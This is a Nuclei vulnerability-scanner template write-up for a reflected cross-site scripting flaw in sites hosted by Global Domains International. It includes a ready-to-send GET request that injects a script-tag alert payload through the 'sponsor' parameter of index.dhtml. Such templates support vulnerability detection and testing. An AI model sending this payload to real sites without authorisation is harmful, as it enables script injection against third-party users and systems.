# Nuclei Template: Global Domains International - Cross-Site Scripting
**Template ID:** global-domains-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`global-domains-xss.yaml`)

## Vulnerability Information & PoC

## Description
Sites hosted by Global Domains International, Inc. have cross-site scripting and directory traversal vulnerabilities.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://cxsecurity.com/issue/WLB-2018020247
- https://packetstormsecurity.com/files/126545/Global-Domains-International-Cross-Site-Scripting-Traversal.html
